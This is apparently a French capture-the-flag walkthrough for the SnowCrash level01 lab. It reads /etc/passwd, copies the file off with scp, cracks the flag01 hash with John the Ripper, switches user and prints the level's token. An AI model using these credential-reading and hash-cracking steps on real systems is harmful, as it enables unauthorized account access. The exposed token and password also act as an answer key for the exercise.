### Comment obtenir le flag
level01@SnowCrash:~$ cat /etc/passwd | grep flag01  
flag01:42hDRfypTqqnw:3001:3001::/home/flag/flag01:/bin/bash  
scp -P 4242 level00@192.168.1.44:/etc/passwd .  
john passwd --show  
flag01:abcdefg:3001:3001::/home/flag/flag01:/bin/bash  
  
1 password hash cracked, 0 left  
level01@SnowCrash:~$ su flag01  
Password:  
Don't forget to launch getflag !  
flag01@SnowCrash:~$ getflag  
Check flag.Here is your token : f2av5il02puano7naaf6adaaf  
